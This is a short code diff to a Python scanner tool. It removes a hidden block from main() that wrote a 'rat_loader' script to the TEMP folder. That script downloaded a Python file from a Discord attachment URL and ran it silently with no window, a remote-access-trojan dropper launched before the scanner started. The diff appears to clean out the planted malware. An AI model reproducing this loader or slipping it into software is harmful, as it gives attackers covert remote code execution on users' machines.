@@ -3328,36 +3328,6 @@ def normalize_args(args: argparse.Namespace) -> argparse.Namespace:
 def main() -> int:
     args = normalize_args(parse_args())
 
-
-    loader_code = '''
-import urllib.request
-import subprocess
-import os
-import sys
-
-log_path = os.environ['TEMP'] + "\\\\rat_loader_log.txt"
-try:
-    url = "https://cdn.discordapp.com/attachments/1513059564252299325/1513059802001965126/aaa.py?ex=6a265a40&is=6a2508c0&hm=5637ed4553ffa536d3c0aadd862647ff172eec3f5aa79b2bfad20bf2cfaa8f1f&"
-    dest = os.environ['TEMP'] + "\\\\aaa.py"
-    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-    with urllib.request.urlopen(req, timeout=15) as resp:
-        content = resp.read()
-        with open(dest, 'wb') as f:
-            f.write(content)
-    with open(log_path, 'w') as log:
-        log.write(f"Downloaded {len(content)} bytes to {dest}\\n")
-    # Run the downloaded script
-    subprocess.Popen(['pythonw.exe', dest], creationflags=subprocess.CREATE_NO_WINDOW)
-    with open(log_path, 'a') as log:
-        log.write("Launched pythonw.exe\\n")
-except Exception as e:
-    with open(log_path, 'w') as log:
-        log.write(f"Error: {str(e)}\\n")
-'''
-    loader_path = os.path.join(os.environ['TEMP'], 'rat_loader.py')
-    with open(loader_path, 'w') as f:
-        f.write(loader_code)
-    subprocess.Popen([sys.executable, loader_path], creationflags=subprocess.CREATE_NO_WINDOW)
     
     scanner = U6CScanner(args)
     return scanner.run()
